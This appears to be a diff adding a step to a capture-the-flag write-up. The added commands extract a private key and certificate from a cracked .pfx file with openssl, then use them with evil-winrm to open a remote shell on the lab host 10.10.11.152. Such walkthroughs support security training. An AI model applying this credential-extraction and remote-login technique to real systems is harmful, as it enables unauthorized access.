@@ -314,7 +314,20 @@ thuglegacy       (legacyy_dev_auth.pfx)
 Use the "--show" opti
 ````
 
+````
+# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out prv.key
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
 
+$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
+Enter Import Password:
+````
+
+````
+$ evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
+
+````
 
 
 ## User
